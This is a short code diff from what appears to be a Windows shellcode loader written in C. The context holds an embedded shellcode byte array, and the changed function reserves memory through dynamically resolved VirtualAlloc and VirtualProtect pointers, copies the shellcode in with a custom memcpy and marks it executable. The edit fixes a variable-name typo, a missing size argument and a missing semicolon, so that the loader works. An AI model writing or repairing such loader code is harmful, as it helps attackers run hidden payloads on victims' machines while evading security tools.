@@ -247,10 +247,10 @@ char shellcode_to_execute[] = "\xfc\xe9\xfa\x0a\x00\x00\xe8\x1f\x04\x00\x00\xe9\
 
 void *shellcode_handling_load(char *shellcode_to_load, int shellcode_to_load_size){
     // Reserve memory, copy contents and change protections
-    void *reserverd_memory = (void *) ((LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[VIRTUAL_ALLOC_INDEX])(NULL,(SIZE_T) shellcode_to_load_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    replacement_memcpy(reserved_memory, shellcode_to_load);
+    void *reserved_memory = (void *) ((LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD)) kernel_library_function_addresses[VIRTUAL_ALLOC_INDEX])(NULL,(SIZE_T) shellcode_to_load_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    replacement_memcpy(reserved_memory, shellcode_to_load, shellcode_to_load_size);
     DWORD oldProtect;
-    (((BOOL (__stdcall *)(LPVOID, DWORD, DWORD, DWORD*)) kernel_library_function_addresses[VIRTUAL_PROTECT_INDEX]) ((LPVOID) reserved_memory, (DWORD) shellcode_to_load_size, PAGE_EXECUTE_READ, &oldProtect))
+    (((BOOL (__stdcall *)(LPVOID, DWORD, DWORD, DWORD*)) kernel_library_function_addresses[VIRTUAL_PROTECT_INDEX]) ((LPVOID) reserved_memory, (DWORD) shellcode_to_load_size, PAGE_EXECUTE_READ, &oldProtect));
     return reserved_memory;    
 }
 
